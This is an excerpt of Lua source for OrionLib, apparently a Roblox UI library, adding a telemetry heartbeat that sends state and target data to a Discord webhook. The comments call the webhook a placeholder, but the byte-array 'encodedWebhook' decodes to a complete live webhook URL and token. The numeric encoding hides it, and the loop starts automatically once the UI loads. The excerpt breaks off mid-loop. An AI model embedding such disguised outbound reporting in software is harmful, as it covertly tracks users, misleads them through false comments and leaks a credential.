...
--========================================================--
-- Nexus telemetry / heartbeat (visible)
--========================================================--
-- IMPORTANT: replace the placeholder below with your own Discord webhook.
-- Do not publish this source with the webhook in a public repository.
-- Tableau d'octets représentant votre URL de webhook
local encodedWebhook = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,51,54,57,57,54,52,52,53,52,49,53,49,53,51,54,54,52,47,45,67,118,81,116,121,89,116,119,69,107,50,69,79,71,109,77,66,115,100,113,101,101,90,73,48,113,55,116,90,108,54,108,81,55,65,72,73,105,86,57,114,82,81,90,54,121,114,88,109,78,52,112,67,98,54,56,48,48,110,56,90,71,70,80,108,98,117}
...
function OrionLib:SetTelemetryState(State)
	Telemetry.State = tostring(State or "Unknown")
end

function OrionLib:SetTelemetryTarget(Target)
	Telemetry.Target = tostring(Target or "None")
end

function OrionLib:SetTelemetryEnabled(Value)
	Telemetry.Enabled = Value == true
end

function OrionLib:SendHeartbeat()
	return SendTelemetry("heartbeat", true)
end

function OrionLib:SendTelemetryEvent(EventName, State, Target)
...
function OrionLib:MakeWindow(WindowConfig)
	...
	AddConnection(MinimizeBtn.MouseButton1Up, ToggleMinimize)

      function OrionLib:Minimize()
        if not Minimized then
            ToggleMinimize()
        end
    end
    
    function OrionLib:Restore()
        if Minimized then
            ToggleMinimize()
        end
    end
	...
	-- Start visible telemetry only after the Orion UI has loaded.
	if Telemetry.Enabled then
		task.spawn(function()
			...
			while OrionLib:IsRunning() and Telemetry.Enabled do
				task.wait(Telemetry.HeartbeatInterval)

				if OrionLib:IsRunning() and Telemetry.Enabled then
